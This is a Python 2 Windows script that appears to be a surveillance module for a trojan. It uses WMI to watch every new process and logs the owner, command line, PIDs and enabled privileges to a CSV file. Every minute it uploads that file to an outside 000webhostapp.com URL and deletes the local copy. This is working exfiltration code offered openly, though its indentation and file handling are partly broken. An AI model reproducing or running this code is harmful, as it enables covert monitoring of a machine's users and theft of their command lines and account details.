import win32con
import win32api
import win32security

import wmi
import sys
import os
import threading
import requests
import time



st_time = time.time()





def get_process_privileges(pid):
    try:
	# get a handle of the target process
      hproc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION,False,pid)
	 # open the main process tiken
      htok = win32security.OpenProcessToken(hproc,win32con.TOKEN_QUERY)
	  
	 # retrieve the list of enabled privileges
      privs = win32security.GetTokenInformation(htok, win32security.TokenPrivileges)	 
      # iterate over privileges and output and the ones that are enabled 
      priv_list = ""
      for i in privs:
        # check if privileges are enabled
        if i[1] == 3:
          priv_list += "%s|" % win32security.LookupPrivilegeName(None,i[0])
    except: 
        priv_list = "N/A"
    return priv_list

def log_to_file(message):
    fd = open("process_monitor.csv" , "ab")
    fd.write("%s\r\n" % message)
    fd.close()
    return
	


def export():
    try:
      print "Exporting"
      url = "http://vidhawansak.000webhostapp.com/site.php/post"
      files = {'document': open('process_monitor.csv','rb')}
      r = requests.post(url, files=files)
      os.remove("process_monitor.csv")
    except:
        pass

def monitor():
     once = False
     global st_time
     c = wmi.WMI()
# create our process monitor
     process_watcher = c.Win32_Process.watch_for("creation")
     print "fire!!"
     while True:
       try:
        print "Look for new process"
        new_process = process_watcher()
        proc_owner = new_process.GetOwner()
        proc_owner = "%s\\%s" % (proc_owner[0],proc_owner[2])
        create_date = new_process.CreationDate
        executable = new_process.ExecutablePath
        cmdline = new_process.CommandLine
        pid = new_process.ProcessId
        parent_pid = new_process.ParentProcessId
        priviledges = get_process_privileges(pid)
        process_log_message = "%s,%s,%s,%s,%s,%s,%s\r\n" % (create_date,proc_owner,executable,cmdline,pid,parent_pid, priviledges)
        print process_log_message
        log_to_file(process_log_message)
        if time.time() - st_time > 60:
            thread_e = threading.Thread(target=export)
            thread_e.start()
            st_time = time.time()
	    if once:
		raise Exception
	    once = True
        # Send to remote
       except:
        print "Timeout"
	if once:
	    raise Exception
        pass

def run(**args):
     global st_time
     st_time = time.time()
     log_to_file("Time , User , Executable , CommandLine , PID , Parent PID, Privileges")
     try:
	   monitor()
     except:
	   print "Exit"
     return True 



